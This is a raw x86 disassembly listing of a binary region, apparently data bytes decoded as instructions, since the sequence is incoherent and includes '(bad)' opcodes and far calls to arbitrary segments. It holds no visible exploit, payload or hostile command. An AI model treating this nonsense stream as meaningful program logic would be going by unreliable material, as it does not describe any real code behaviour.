  412fb0:	and    BYTE PTR [eax],dl
  412fb2:	add    al,0x40
  412fb4:	add    BYTE PTR [eax+0x7098010],al
  412fba:	or     al,0x70
  412fbc:	inc    ebx
  412fbd:	adc    al,0x2
  412fbf:	sbb    BYTE PTR [ecx+0x52002004],cl
  412fc5:	add    al,0x12
  412fc7:	add    DWORD PTR [eax],eax
  412fc9:	enter  0xb400,0x94
  412fcd:	pop    ss
  412fce:	sbb    ch,BYTE PTR [eax+eax*1]
  412fd1:	add    BYTE PTR [ebx-0x20],cl
  412fd4:	add    BYTE PTR [eax],dl
  412fd6:	sbb    DWORD PTR [eax+0x63],ebp
  412fd9:	and    BYTE PTR [ecx+0x4c],cl
  412fdc:	xor    BYTE PTR [eax+0x8],dl
  412fdf:	sbb    BYTE PTR [edx],al
  412fe1:	adc    edx,eax
  412fe3:	leave  
  412fe4:	mov    BYTE PTR [eax],al
  412fe6:	add    eax,0x6d000088
  412feb:	add    BYTE PTR [eax+0x2340652],al
  412ff1:	add    BYTE PTR [ebx],ah
  412ff3:	sub    DWORD PTR [eax+0x30],edx
  412ff6:	inc    eax
  412ff7:	mov    eax,DWORD PTR [esi]
  412ff9:	inc    eax
  412ffa:	push   esp
  412ffb:	cmp    DWORD PTR [edx+ecx*2],eax
  412ffe:	or     DWORD PTR [eax],0x840fc050
  413004:	add    al,al
  413006:	into   
  413007:	and    eax,0xc00c240
  41300c:	add    al,0x1
  41300e:	add    cl,al
  413010:	sub    al,0x11
  413012:	add    BYTE PTR [eax],dh
  413014:	test   BYTE PTR [eax],al
  413016:	add    DWORD PTR [esi+0x2],0x93b0d420
  41301d:	mov    bl,BYTE PTR [ecx-0x7ff9fffd]
  413023:	adc    al,0x22
  413025:	push   es
  413026:	les    ebp,FWORD PTR [eax+esi*2]
  413029:	enter  0x550,0x4
  41302d:	adc    eax,eax
  41302f:	add    BYTE PTR [edx+0x2bd8c342],ah
  413035:	push   eax
  413036:	and    BYTE PTR [eax],0x58
  413039:	add    BYTE PTR [edx],cl
  41303b:	lods   al,BYTE PTR ds:[esi]
  41303c:	adc    BYTE PTR [eax+0x7e64848a],al
  413042:	mov    al,BYTE PTR [eax]
  413044:	and    al,0x44
  413046:	inc    esi
  413047:	add    al,0x12
  413049:	add    ah,dl
  41304b:	sub    BYTE PTR [eax+eax*1],bh
  41304e:	in     al,0x4
  413050:	add    BYTE PTR [ebx+0x11],bl
  413053:	adc    DWORD PTR [ecx],ecx
  413055:	or     BYTE PTR [eax-0x63375ff8],ah
  41305b:	push   es
  41305c:	add    eax,0x5141013
  413061:	cmp    eax,0x7a602240
  413066:	popa   
  413067:	fld    DWORD PTR [ecx+0x11]
  41306a:	inc    eax
  41306b:	dec    ebp
  41306c:	push   eax
  41306d:	inc    eax
  41306e:	rol    BYTE PTR [edx],1
  413070:	push   ss
  413071:	nop
  413072:	sbb    DWORD PTR [eax-0x79],eax
  413075:	nop
  413076:	inc    eax
  413077:	xchg   esp,eax
  413078:	and    bl,cl
  41307a:	sub    al,BYTE PTR [esi]
  41307c:	dec    esp
  41307d:	or     DWORD PTR [ecx+0x25c00a01],ebp
  413083:	add    DWORD PTR [ecx+0x24080280],ecx
  413089:	add    BYTE PTR [edx],al
  41308b:	nop
  41308c:	add    eax,0x2001810a
  413091:	cwde   
  413092:	push   ebx
  413093:	sub    BYTE PTR [ecx],al
  413095:	sbb    BYTE PTR [eax],bl
  413097:	mov    al,ds:0x5000122
  41309c:	adc    al,0x40
  41309e:	leave  
  41309f:	mov    ds:0x84a1c40,al
  4130a4:	sahf   
  4130a5:	or     al,BYTE PTR [ecx]
  4130a7:	inc    eax
  4130a8:	push   eax
  4130a9:	test   BYTE PTR [edx+0xe],al
  4130ac:	inc    esp
  4130ad:	inc    ecx
  4130ae:	mov    eax,ds:0x51b0740
  4130b3:	add    ah,al
  4130b5:	add    BYTE PTR [ecx],dl
  4130b7:	or     DWORD PTR [edx],eax
  4130b9:	add    BYTE PTR [eax+0x4420618],0xb8
  4130c0:	push   eax
  4130c1:	add    DWORD PTR [eax],edx
  4130c3:	push   eax
  4130c4:	add    DWORD PTR [esi+0x8120200],0xc26180
  4130ce:	inc    eax
  4130cf:	and    al,0x2
  4130d1:	xchg   esp,eax
  4130d2:	sbb    al,BYTE PTR [edx-0x7c]
  4130d5:	add    BYTE PTR [ecx-0x7fee73df],dl
  4130db:	test   al,0x56
  4130dd:	add    ah,BYTE PTR [edx+0x39]
  4130e0:	inc    esp
  4130e1:	add    BYTE PTR [eax+0xc],0x40
  4130e5:	adc    BYTE PTR [ecx+0x0],ah
  4130e8:	mov    BYTE PTR [eax+0x200a2505],al
  4130ee:	sbb    al,BYTE PTR [eax]
  4130f0:	and    BYTE PTR [eax],al
  4130f2:	inc    ecx
  4130f3:	push   eax
  4130f4:	and    BYTE PTR [ecx+0x25],0x10
  4130f8:	or     al,0x88
  4130fa:	add    al,0x31
  4130fc:	sbb    BYTE PTR [ebx],dl
  4130fe:	inc    eax
  4130ff:	mov    BYTE PTR [edx+ecx*4],cl
  413102:	sbb    DWORD PTR [esi],edx
  413104:	adc    BYTE PTR [edx],al
  413106:	add    DWORD PTR [ecx+0x10],eax
  413109:	shl    DWORD PTR [esp+ecx*4],0x1
  41310d:	xchg   ecx,eax
  41310e:	rol    BYTE PTR [eax],0x80
  413111:	inc    ecx
  413112:	nop
  413113:	jo     0x413095
  413115:	or     BYTE PTR [ecx],al
  413117:	inc    eax
  413118:	and    BYTE PTR [edx-0x68e7b5fe],dl
  41311e:	add    BYTE PTR [esp+eax*1],al
  413121:	add    BYTE PTR [ebp+eax*1+0xc0c030],ah
  413128:	(bad)  
  413129:	sbb    BYTE PTR [eax],ah
  41312b:	add    BYTE PTR [edx+0x41084041],bl
  413131:	lds    esp,FWORD PTR [eax-0x75fbdb7c]
  413137:	push   es
  413138:	add    eax,0xb00824d2
  41313d:	add    al,0xa
  41313f:	mov    eax,ds:0x20000381
  413144:	add    DWORD PTR [ecx],eax
  413146:	add    BYTE PTR [eax],ah
  413148:	add    BYTE PTR [ebp+0x8],al
  41314b:	add    al,0x26
  41314e:	call   0xe001:0x8200e113
  413155:	adc    eax,0x48180800
  41315a:	and    eax,0x80082028
  41315f:	sub    BYTE PTR [ebx],al
  413161:	add    al,0x80
  413163:	or     dl,BYTE PTR [eax]
  413165:	and    al,al
  413167:	adc    BYTE PTR [eax],al
  413169:	or     BYTE PTR [ecx],dl
  41316b:	and    al,BYTE PTR [ecx]
  41316d:	or     eax,0xa1205200
  413172:	or     al,0x80
  413174:	add    al,0xc5
  413176:	add    al,BYTE PTR ds:0xe0510004
  41317c:	adc    al,0x40
  41317e:	add    BYTE PTR [eax],cl
  413180:	adc    cl,BYTE PTR [eax+eax*1]
  413183:	es inc eax
  413185:	and    BYTE PTR [eax],ah
  413187:	or     eax,0xa2441022
  41318c:	dec    edx
  41318d:	or     BYTE PTR [eiz*1+0x8020481],al
  413194:	push   cs
  413195:	or     BYTE PTR [edx],al
  413197:	cmp    BYTE PTR [ebx],ah
  413199:	xchg   ebx,eax
  41319a:	or     al,BYTE PTR [ecx]
  41319c:	add    eax,0x4082800a
  4131a1:	or     al,0x8c
  4131a3:	xor    al,ch
  4131a5:	add    BYTE PTR [eax+0x1],ah
  4131a8:	sbb    al,0x40
  4131aa:	add    BYTE PTR [eax+0x33],al
  4131ad:	or     BYTE PTR [ebp+0x202c0680],ah
  4131b3:	adc    BYTE PTR [eax],0x90
  4131b6:	add    al,0x18
  4131b8:	and    BYTE PTR [ebx],ah
  4131ba:	adc    DWORD PTR [ecx],eax
  4131bc:	add    al,0x9
  4131be:	push   ebx
  4131bf:	xchg   esi,eax
  4131c0:	or     BYTE PTR [eax+0x40000010],dh
  4131c6:	add    al,0x5
  4131c8:	pusha  
  4131c9:	and    al,0x4
  4131cb:	cwde   
  4131cc:	les    edi,FWORD PTR [ecx]
  4131ce:	add    BYTE PTR [eax],al
  4131d0:	add    BYTE PTR [ecx-0x20],al
  4131d3:	or     BYTE PTR [ecx+eiz*1+0x2],cl
  4131d7:	push   ss
  4131d8:	inc    eax
  4131d9:	aam    0x62
  4131db:	inc    eax
  4131dc:	add    DWORD PTR [eax+0x415200c0],ebx
  4131e2:	add    eax,0x6a9002b0
  4131e7:	add    BYTE PTR [eax+0x18],cl
  4131ea:	add    eax,DWORD PTR [ecx+eiz*8]
  4131ed:	or     BYTE PTR [ecx+0x20820c4],cl
  4131f3:	push   ss
  4131f4:	jno    0x413227
  4131f6:	xor    al,BYTE PTR [eax]
  4131f8:	in     al,dx
  4131f9:	add    al,0x0
  4131fb:	imul   ecx,DWORD PTR [ecx-0x4],0x20444093
  413202:	add    al,0x4
  413204:	add    ah,al
  413206:	or     al,0x40
  413208:	add    BYTE PTR [esi+0x0],al
  41320b:	add    al,BYTE PTR [ecx+eax*1]
  41320e:	loopne 0x413279
  413210:	dec    eax
  413211:	cmp    al,0x0
  413213:	call   0x74823a22
  413218:	popa   
  413219:	add    BYTE PTR [edx+0x40912d00],al
  41321f:	cmp    BYTE PTR [ecx-0x46bfc000],dl
  413225:	add    BYTE PTR [eax],cl
  413227:	inc    edx
  413228:	adc    DWORD PTR [edx],eax
  41322a:	mov    al,ds:0x8004
  41322f:	ret    0x8
  413232:	and    eax,0x80800101
  413237:	pop    eax
  413238:	add    esp,DWORD PTR [edx+0x54]
  41323b:	or     BYTE PTR [eax+ecx*2],al
  41323e:	add    BYTE PTR [ecx],ch
  413240:	add    BYTE PTR [eax],al
  413242:	or     al,0xe5
  413244:	sbb    al,0x5
  413246:	add    al,0x82
  413248:	pop    ecx
  413249:	sbb    al,BYTE PTR [eax]
  41324b:	inc    eax
  41324c:	stos   BYTE PTR es:[edi],al
  41324d:	add    DWORD PTR [eax],esi
  41324f:	cwde   
  413250:	add    esp,DWORD PTR [eax]
  413252:	add    BYTE PTR [ecx],ah
  413254:	push   edx
  413255:	or     al,0x1
  413257:	xchg   esp,eax
  413258:	inc    eax
  413259:	add    ah,BYTE PTR [eax]
  41325b:	add    BYTE PTR [edi+0x41800801],ah
  413261:	add    BYTE PTR [eax],al
  413263:	adc    DWORD PTR ds:0x40804088,ebx
  413269:	xchg   BYTE PTR [ebp+0x9],al
  41326c:	add    BYTE PTR [edx+0x40202410],al
  413272:	jmp    0x2200:0x82df12
  413279:	inc    ebp
  41327a:	sbb    BYTE PTR gs:[eax-0x6f],0x60
  41327f:	nop
  413280:	add    cl,BYTE PTR [eax]
  413282:	adc    eax,0x45040134
  413287:	adc    DWORD PTR [esi],0xffffffa8
  41328a:	push   eax
  41328b:	or     al,BYTE PTR [eax+0x8d80414]
  413291:	xchg   esp,eax
  413292:	and    BYTE PTR [edx],dh
  413294:	and    BYTE PTR [eax+eax*1],ch
  413297:	add    DWORD PTR [eax],eax
  413299:	and    BYTE PTR [esi+0x0],al
  41329c:	sbb    edx,DWORD PTR [eax]
  41329e:	femms  
  4132a0:	add    BYTE PTR [eax-0x60],ah
  4132a3:	xchg   ecx,eax
  4132a4:	add    BYTE PTR [edx],cl
  4132a6:	mov    ds:0x14001801,eax
  4132ab:	inc    eax
  4132ac:	and    al,0x42
  4132ae:	add    al,BYTE PTR [ecx]
  4132b0:	or     DWORD PTR [edx],eax
  4132b2:	or     BYTE PTR [edx],al
  4132b4:	add    al,0x49
  4132b6:	mov    DWORD PTR [edx-0x7d],ecx
  4132b9:	mov    al,0x21
  4132bb:	mov    al,0x8
  4132bd:	adc    al,0x10
  4132bf:	add    BYTE PTR [eax],bl
  4132c1:	rol    BYTE PTR [eax],0x64
  4132c4:	add    esp,DWORD PTR [eax]
  4132c6:	add    eax,0xd4040481
  4132cb:	sub    al,0x0
  4132cd:	inc    esp
  4132ce:	add    BYTE PTR [ecx],ch
  4132d0:	rcl    DWORD PTR [edx+0x2a],0x49
  4132d4:	test   BYTE PTR [eax+0x2b4020],al
  4132da:	and    BYTE PTR [ecx],al
  4132dc:	add    BYTE PTR ds:0xacc24288,bl
  4132e2:	adc    BYTE PTR [eax+0x3c42017],0x5
  4132e9:	add    BYTE PTR [ecx+0x27],0x31
  4132ed:	push   edx
  4132ee:	and    BYTE PTR [ecx],0x0
  4132f1:	dec    ecx
  4132f2:	or     ecx,DWORD PTR [eax]
  4132f4:	or     eax,0x18a1c26b
  4132f9:	add    BYTE PTR [eax-0x6dae05bc],al
  4132ff:	adc    BYTE PTR [esi],al
  413301:	or     BYTE PTR [ecx+0x55801d25],bl
  413307:	jl     0x413309
  413309:	add    BYTE PTR [eax+eax*1],bh
  41330c:	add    eax,0x40125135
  413311:	adc    BYTE PTR [ecx],cl
  413313:	adc    BYTE PTR [ecx+eax*1],al
  413316:	add    BYTE PTR [eax],al
  413318:	add    al,0x0
  41331a:	add    BYTE PTR [ecx-0x5f9f2fb6],dl
  413320:	and    ah,BYTE PTR [eax+0xd329020]
  413326:	add    DWORD PTR [eax],esi
  413328:	shl    BYTE PTR [eax+eax*2],cl
  41332b:	or     DWORD PTR [eax+eax*1+0x50ac8047],ecx
  413332:	add    BYTE PTR [esp+ecx*2+0x12],dh
  413336:	add    DWORD PTR [ebx+0x1],eax
  413339:	adc    al,0xb4
  41333b:	add    al,BYTE PTR [eax]
  41333d:	push   edx
  41333e:	add    BYTE PTR [ecx-0x7f7b6faf],ah
  413344:	sbb    BYTE PTR [eax],dh
  413346:	add    BYTE PTR [eax+eax*1],al
  413349:	nop
  41334a:	inc    ebp
  41334b:	xchg   ecx,eax
  41334c:	add    ah,dh
  41334e:	and    DWORD PTR [edx],eax
  413350:	or     al,BYTE PTR [eax]
  413352:	and    DWORD PTR [eax],eax
  413354:	jmp    0x256534c0
  413359:	mov    al,ds:0x81408038
  41335e:	and    BYTE PTR [eax+eiz*2+0x5],dl
  413362:	sbb    BYTE PTR [edx+0x0],al
  413365:	inc    eax
  413366:	xchg   ecx,eax
  413367:	jo     0x413373
  413369:	add    DWORD PTR ds:0x680001a1,0x32
  413370:	jmp    0x94d0:0x804188
  413377:	sbb    BYTE PTR [eax+0x0],0x61
  41337b:	push   cs
  41337c:	add    esp,DWORD PTR [ecx+0x4b]
  41337f:	or     BYTE PTR [eax],cl
  413381:	adc    BYTE PTR [eax],al
  413383:	dec    esp
  413384:	or     al,0x2c
  413386:	mov    dl,BYTE PTR [edx+0x50bcf048]
  41338c:	push   eax
  41338d:	adc    cl,BYTE PTR [esp+eax*1]
  413390:	les    eax,FWORD PTR [ecx-0x7d9bdfb8]
  413396:	add    edx,eax
  413398:	add    BYTE PTR [eax+0x20400b02],0x0
  41339f:	add    DWORD PTR ds:0x22cac01,eax
  4133a5:	or     al,BYTE PTR [eax]
  4133a7:	add    BYTE PTR [edi+0x0],0x95
  4133ab:	and    BYTE PTR [esi],dl
  4133ad:	pusha  
  4133ae:	les    eax,FWORD PTR [eax+0x2500801]
  4133b4:	pusha  
  4133b5:	xchg   ebx,eax
  4133b6:	add    al,0x54
  4133b8:	add    eax,0x41056499
  4133bd:	xchg   edx,eax
  4133be:	and    BYTE PTR ds:0x109a00a,0x59
  4133c5:	and    BYTE PTR [ebx],al
  4133c7:	or     BYTE PTR [eax+0x4d],0x80
  4133cb:	add    BYTE PTR [edx],al
  4133cd:	add    DWORD PTR [eax],eax
  4133cf:	add    al,al
  4133d1:	jno    0x413378
  4133d3:	sbb    edx,DWORD PTR [edx]
  4133d5:	xchg   DWORD PTR [ecx+eax*1],ecx
  4133d8:	pop    ebx
  4133d9:	jno    0x4133de
  4133db:	pusha  
  4133dc:	mov    BYTE PTR [eax],cl
  4133de:	push   eax
  4133df:	and    bl,BYTE PTR [ecx+eax*1]
  4133e2:	or     BYTE PTR [eax],bh
  4133e4:	push   es
  4133e5:	inc    esp
  4133e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133e7:	add    DWORD PTR [eax],esp
  4133e9:	mov    ecx,es
  4133eb:	and    BYTE PTR [ecx+eax*2+0x0],dl
  4133ef:	inc    eax
  4133f0:	add    cl,dh
  4133f2:	dec    ecx
  4133f3:	fs or  eax,0x8482140
  4133f9:	rcl    BYTE PTR [eax],0x27
  4133fc:	mov    WORD PTR [eax],?
  4133fe:	add    DWORD PTR [eax+0x10481461],eax
  413404:	adc    al,0x16
  413406:	or     BYTE PTR [eax+0xc23480],al
  41340c:	inc    ecx
  41340d:	xor    BYTE PTR [eax-0x7fef9f00],cl
  413413:	cwde   
  413414:	sbb    BYTE PTR [edx+ecx*1+0x10],ah
  413418:	or     BYTE PTR [eax],ah
  41341a:	gs and eax,0x57c41190
  413420:	push   cs
  413421:	add    DWORD PTR [eax],eax
  413423:	and    al,BYTE PTR [ecx+ecx*4]
  413426:	pusha  
  413427:	adc    BYTE PTR [edx],cl
  413429:	nop
  41342a:	mov    ecx,0xca88140
  41342f:	add    ah,BYTE PTR [edx+0x22a08888]
  413435:	push   esp
  413436:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413437:	adc    DWORD PTR [esi+0x19a20a0],ecx
  41343d:	inc    edx
  41343e:	adc    BYTE PTR [eax],ah
  413440:	test   edx,eax
  413442:	mov    al,BYTE PTR [ebx-0x80]
  413445:	inc    esp
  413446:	or     eax,0x812404e0
  41344b:	add    BYTE PTR [esi+0x1602001],al
  413451:	add    BYTE PTR [edx+0x2],al
  413454:	xor    DWORD PTR [edi-0x7f1fde00],eax
  41345a:	add    eax,DWORD PTR [eax-0x2a]
  41345d:	and    BYTE PTR [eax],ch
  41345f:	dec    eax
  413460:	or     eax,DWORD PTR [esi+0x4450881]
  413466:	(bad)  
  413468:	adc    DWORD PTR [ecx],eax
  41346a:	adc    ch,ah
  41346c:	inc    eax
  41346d:	retf   0x1680
  413470:	or     al,BYTE PTR [ecx]
  413472:	ror    BYTE PTR [eax],0x21
  413475:	add    DWORD PTR [ecx+eax*1+0x8115121],0x84898079
  413480:	add    eax,0x841c0028
  413485:	adc    BYTE PTR [eax+0x40224940],0x1
  41348c:	rol    BYTE PTR [esi],cl
  41348e:	sub    dl,BYTE PTR [eax+eax*8]
  413491:	and    ecx,ecx
  413493:	and    BYTE PTR [eax+0x50828],dl
  413499:	add    eax,0x82922d18
  41349e:	inc    edx
  41349f:	cwde   
  4134a0:	add    al,0x10
  4134a2:	call   0x2188:0x98160880
  4134a9:	rcl    BYTE PTR [eax],0x11
  4134ac:	add    BYTE PTR [eax],al
  4134ae:	add    al,al
  4134b0:	or     BYTE PTR [ebx+0x22228158],al
  4134b6:	fmul   DWORD PTR [eax+0x8]
  4134b9:	and    eax,0x6c068c0
  4134be:	imul   eax,DWORD PTR [eax+eax*1+0x5050a001],0x8c041862
  4134c9:	test   DWORD PTR [edx+ebp*4+0x52],eax
  4134cd:	and    al,0x2
  4134cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134d0:	add    dl,BYTE PTR [ecx]
  4134d2:	add    al,0x0
  4134d4:	add    cl,cl
  4134d6:	add    eax,0x69c3f004
  4134db:	xchg   esp,eax
  4134dc:	add    BYTE PTR [ecx-0x7faf75e0],al
  4134e2:	inc    esp
  4134e3:	test   BYTE PTR [eax],ch
  4134e5:	dec    eax
  4134e6:	dec    esp
  4134e7:	inc    ebp
  4134e8:	add    dl,BYTE PTR [ebx+0x70820904]
  4134ee:	adc    BYTE PTR [eax+0x422b4921],al
  4134f4:	adc    al,0x60
  4134f6:	inc    eax
  4134f7:	and    al,al
  4134f9:	nop
  4134fa:	add    al,0x24
  4134fc:	add    eax,0x40240389
  413501:	lds    esi,FWORD PTR [eax+0x3b]
  413504:	add    BYTE PTR [esi],cl
  413506:	call   0x2095:0x9008bac8
  41350d:	add    DWORD PTR [eax+0x60],esi
  413510:	and    cl,BYTE PTR [eax+0x42]
  413513:	pop    eax
  413514:	pusha  
  413515:	or     BYTE PTR [eax],al
  413517:	add    cl,cl
  413519:	or     DWORD PTR [ebp+0x8],ecx
  41351c:	and    BYTE PTR [ecx+0x31009802],al
  413522:	and    BYTE PTR [ecx],cl
  413524:	xor    BYTE PTR [eax+0x48402139],dh
  41352a:	add    BYTE PTR [eax],0x20
  41352d:	and    DWORD PTR [eax+eiz*2-0x30],esp
  413531:	xor    al,0x75
  413533:	add    BYTE PTR [ebx-0x54],al
  413536:	add    ecx,eax
  413538:	and    esp,DWORD PTR [eax+eax*4+0x4a485102]
  41353f:	dec    eax
  413540:	add    BYTE PTR [eax],al
  413542:	add    al,0x84
  413544:	and    BYTE PTR [ecx+0x10b64240],0xc4
  41354b:	inc    eax
  41354c:	pop    ecx
  41354d:	or     al,0x84
  41354f:	add    DWORD PTR [eax+0xc410110],esp
  413555:	adc    BYTE PTR [edx+0x4f68b07a],al
  41355b:	add    al,0x81
  41355d:	push   0x8004091
  413562:	add    DWORD PTR [esi+0x20],eax
  413565:	add    ah,BYTE PTR [eax-0x7e]
  413568:	add    al,0x42
  41356a:	push   edx
  41356b:	test   BYTE PTR [edx],al
  41356d:	add    ecx,DWORD PTR [edx+eiz*4]
  413570:	sub    BYTE PTR [ebp+0x8260082],al
  413576:	jo     0x413584
  413578:	and    BYTE PTR [edx],bl
  41357a:	add    BYTE PTR [edx],dl
  41357c:	or     BYTE PTR [eax],bl
  41357e:	or     al,0x61
  413580:	les    esp,FWORD PTR [eax]
  413582:	add    DWORD PTR [ecx],ebp
  413584:	and    BYTE PTR [ecx],al
  413586:	sbb    eax,0x36010202
  41358b:	add    cl,BYTE PTR [eax]
  41358d:	ror    BYTE PTR [esi+0x8200000],0x1
  413594:	inc    esp
  413595:	inc    esi
  413596:	sub    BYTE PTR [edx+edx*1],ah
  413599:	mov    DWORD PTR [eax],eax
  41359b:	add    BYTE PTR [ecx+0x4],bl
  41359e:	add    BYTE PTR [eax],cl
  4135a0:	add    BYTE PTR [ecx],dl
  4135a2:	cwde   
  4135a3:	sub    cl,BYTE PTR [ecx-0x7f]
  4135a6:	add    al,0x0
  4135a8:	push   ss
  4135a9:	or     DWORD PTR [eax],0x20380099
  4135af:	enter  0xd174,0xa
  4135b3:	and    BYTE PTR [eax],al
  4135b5:	push   esp
  4135b6:	and    BYTE PTR [ecx+0x304a075],0x44
  4135bd:	and    DWORD PTR [ebx],eax
  4135bf:	sub    dl,al
  4135c1:	push   ecx
  4135c2:	xor    DWORD PTR [esi],eax
  4135c4:	add    al,0x48
  4135c6:	test   DWORD PTR [eax],eax
  4135c8:	add    BYTE PTR [ebp+0xa2030c8],al
  4135ce:	or     BYTE PTR [esp+esi*1],al
  4135d1:	xor    ah,BYTE PTR [edx+0x2003490]
  4135d7:	nop
  4135d8:	add    BYTE PTR [edx],al
  4135da:	mov    ch,0x8a
  4135dc:	and    eax,eax
  4135de:	and    eax,0x20000
  4135e3:	cdq    
  4135e4:	shl    BYTE PTR [eax],0xd1
  4135e7:	inc    ecx
  4135e8:	adc    al,0x3
  4135ea:	push   ds
  4135eb:	add    DWORD PTR [eax+0x10],eax
  4135ee:	sbb    BYTE PTR [edx],cl
  4135f0:	sbb    DWORD PTR [eax+0x18],eax
  4135f3:	or     BYTE PTR [eax],al
  4135f5:	add    BYTE PTR [eax-0x50],dl
  4135f8:	add    BYTE PTR [eax],cl
  4135fa:	mov    cl,0x1a
  4135fc:	or     BYTE PTR [eax],dl
  4135fe:	add    DWORD PTR ds:0x81132430,edx
  413604:	add    ah,al
  413606:	and    BYTE PTR ds:0x8412a000,0x20
  41360d:	and    BYTE PTR [eax-0x7f],al
  413610:	adc    BYTE PTR [ecx],dh
  413612:	adc    eax,0x22010000
  413617:	add    al,0x14
  413619:	or     DWORD PTR [edx+0x4],0x50408070
  413620:	cwde   
  413621:	and    eax,0x914100c8
  413626:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413627:	imul   edx,DWORD PTR [esi],0x38
  41362a:	adc    BYTE PTR [eax],al
  41362c:	or     DWORD PTR cs:0xc300010b,eax
  413633:	inc    esp
  413634:	stos   BYTE PTR es:[edi],al
  413635:	add    DWORD PTR [esp+edx*2+0x888c004],eax
  41363c:	add    BYTE PTR [eax+eax*1+0x6a],0xe1
  413641:	nop
  413642:	and    BYTE PTR [ecx],dl
  413644:	adc    BYTE PTR [ecx-0x5f1e1ec8],0x24
  41364b:	mov    al,ds:0x49406040
  413650:	sub    ah,al
  413652:	pusha  
  413653:	inc    esp
  413654:	pop    edx
  413655:	mov    cl,0x24
  413657:	or     BYTE PTR ds:0x85342048,al
  41365d:	sub    BYTE PTR [eax-0x60],cl
  413660:	add    edx,DWORD PTR [edx]
  413662:	inc    eax
  413663:	adc    BYTE PTR [edi+0x60],ch
  413666:	add    BYTE PTR [esi+0x7c368602],ch
  41366c:	arpl   WORD PTR [edx+0x180122e9],sp
  413672:	dec    ecx
  413673:	inc    esp
  413674:	nop
  413675:	dec    ecx
  413676:	rol    dl,1
  413678:	inc    edx
  413679:	sub    BYTE PTR [ecx],dl
  41367b:	mov    al,ds:0x6a218c20
  413680:	add    eax,0xf803000
  413685:	add    BYTE PTR [eax+eax*1-0x80],dl
  413689:	add    BYTE PTR [ebx+0x304098e4],dh
  41368f:	inc    eax
  413690:	or     al,BYTE PTR [ecx+0x124c1145]
  413696:	add    BYTE PTR [ebx-0x58],cl
  413699:	dec    edx
  41369a:	inc    esp
  41369b:	adc    BYTE PTR [eax],al
  41369d:	add    DWORD PTR [eax+0x10],ecx
  4136a0:	adc    BYTE PTR [eax-0x79fffbbc],al
  4136a6:	add    ah,BYTE PTR [eax]
  4136a8:	inc    esp
  4136a9:	adc    al,BYTE PTR es:[eax]
  4136ac:	add    al,0xa0
  4136ae:	adc    BYTE PTR [eax],ah
  4136b0:	inc    esp
  4136b1:	pop    es
  4136b2:	inc    eax
  4136b3:	or     al,al
  4136b5:	aaa    
  4136b6:	sub    al,BYTE PTR [eax+0x44240020]
  4136bc:	or     BYTE PTR [edx+0x25],0x24
  4136c0:	add    BYTE PTR [eax],al
  4136c2:	or     BYTE PTR [eax],al
  4136c4:	add    BYTE PTR [ebp+0x0],dl
  4136c7:	test   BYTE PTR [edx],al
  4136c9:	pop    ds
  4136ca:	push   eax
  4136cb:	mov    BYTE PTR [eax+eax*2],al
  4136ce:	add    BYTE PTR [edx],al
  4136d0:	add    BYTE PTR [edx+0x0],0x90
  4136d4:	adc    BYTE PTR [esp+eax*2],0x2
  4136d8:	add    BYTE PTR [edx-0x68],dl
  4136db:	lods   eax,DWORD PTR ds:[esi]
  4136dc:	add    BYTE PTR [eax],dh
  4136de:	dec    eax
  4136df:	adc    BYTE PTR [ecx],al
  4136e1:	inc    eax
  4136e2:	mov    al,ds:0x50125008
  4136e7:	and    BYTE PTR [eax],0x8c
  4136ea:	or     cl,BYTE PTR [ebp+0x2121b916]
  4136f0:	sub    al,BYTE PTR [eax]
  4136f2:	cdq    
  4136f3:	add    al,BYTE PTR [eax]
  4136f5:	adc    BYTE PTR [eax+eax*1-0x675fff6c],dl
  4136fc:	addr16 xor al,al
  4136ff:	test   BYTE PTR [eax],cl
  413701:	lea    edi,[eax-0x7e]
  413704:	add    BYTE PTR [ecx],0xa4
  413707:	or     BYTE PTR ds:0x200a010c,0x2
  41370e:	xor    BYTE PTR [edx+0x9],cl
  413711:	fadd   DWORD PTR [eax+0x4]
  413714:	add    BYTE PTR [eax],al
  413716:	add    ah,al
  413718:	test   DWORD PTR [eax+0x2a004814],edx
  41371e:	adc    BYTE PTR [eax+eax*1],0x58
  413722:	or     DWORD PTR [eax],ebp
  413724:	and    al,0x21
  413726:	or     esp,DWORD PTR [esi]
  413728:	call   DWORD PTR ds:0x435c28
  41372e:	mov    al,fs:0x4661800
  413734:	add    al,0x60
  413736:	jno    0x41373a
  413738:	stos   BYTE PTR es:[edi],al
  413739:	ror    BYTE PTR [ecx],0x89
  41373c:	inc    eax
  41373d:	add    BYTE PTR [eax+0x28],bh
  413740:	sub    ecx,eax
  413742:	mov    al,ds:0x6458068
  413747:	xchg   BYTE PTR [eax],bl
  413749:	adc    al,0x89
  41374b:	add    al,0x13
  41374d:	sub    al,0x81
  41374f:	inc    edx
  413750:	add    BYTE PTR [edx+eax*2],dl
  413753:	inc    ebp
  413754:	adc    BYTE PTR [edx],cl
  413756:	or     DWORD PTR [edx],ebp
  413758:	adc    DWORD PTR [ebx+0x1000000],eax
  41375e:	inc    eax
  41375f:	add    eax,eax
  413761:	mov    BYTE PTR [eax+eax*2+0x24],cl
  413765:	or     cl,BYTE PTR [ecx]
  413767:	xor    dh,BYTE PTR [esi+0x2420a00]
  41376d:	inc    ecx
  41376e:	add    BYTE PTR [eax],0x14
  413771:	pusha  
  413772:	dec    eax
  413773:	adc    al,bh
  413775:	test   DWORD PTR [esi+0x29802],eax
  41377b:	dec    edx
  41377c:	pusha  
  41377d:	and    al,0x34
  41377f:	mov    ch,0x4
  413781:	and    BYTE PTR [eax],0xc4
  413784:	ins    DWORD PTR es:[edi],dx
  413785:	mov    eax,ds:0x1906002
  41378a:	inc    eax
  41378b:	or     DWORD PTR [eax+0x74],esp
  41378e:	adc    BYTE PTR [eax+0x0],0x10
  413792:	add    al,BYTE PTR [ecx+edx*4]
  413795:	xor    al,0x20
  413797:	inc    ebp
  413798:	or     ah,BYTE PTR [edx]
  41379a:	inc    ecx
  41379b:	test   BYTE PTR [edx+0x20],dh
  41379e:	sub    al,0x20
  4137a0:	call   0x6080:0x1856480
  4137a7:	adc    al,0x16
  4137a9:	mov    al,ds:0xe2790080
  4137ae:	xor    DWORD PTR [eax+esi*4],edx
  4137b1:	int3   
  4137b2:	push   ebp
  4137b3:	adc    BYTE PTR [eax+0x1800a02],0x10
  4137ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137bb:	sbb    BYTE PTR [eax],al
  4137bd:	add    esp,DWORD PTR [edx]
  4137bf:	add    al,bl
